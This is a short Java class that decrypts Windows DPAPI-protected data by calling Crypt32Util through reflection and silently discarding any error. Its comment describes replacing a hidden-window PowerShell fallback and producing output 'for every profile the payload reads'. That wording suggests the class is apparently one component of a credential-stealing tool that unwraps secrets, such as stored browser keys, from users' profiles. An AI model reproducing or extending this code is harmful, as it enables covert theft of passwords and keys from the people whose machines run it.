package dev.goentl.rift.support;

/* DPAPI unwrap, in-process.

   The blob is a CryptProtectData envelope; Crypt32Util.cryptUnprotectData is
   the same call the old powershell fallback made through ProtectedData, minus
   the child process, the temp .ps1 and the hidden window. Identical bytes out,
   for every profile the payload reads. */
final class UserProtection {

    private UserProtection() {}

    static byte[] unprotect(byte[] blob) {
        if (blob == null || blob.length == 0) return null;
        try {
            Class<?> dataBlob = Class.forName("com.sun.jna.platform.win32.WinCrypt$DATA_BLOB");
            Class<?> crypt32 = Class.forName("com.sun.jna.platform.win32.Crypt32Util");
            Object input = dataBlob.getConstructor(byte[].class).newInstance((Object) blob);
            byte[] out = (byte[]) crypt32.getMethod("cryptUnprotectData", dataBlob).invoke(null, input);
            return out == null || out.length == 0 ? null : out;
        } catch (Throwable ignored) {
            return null;
        }
    }
}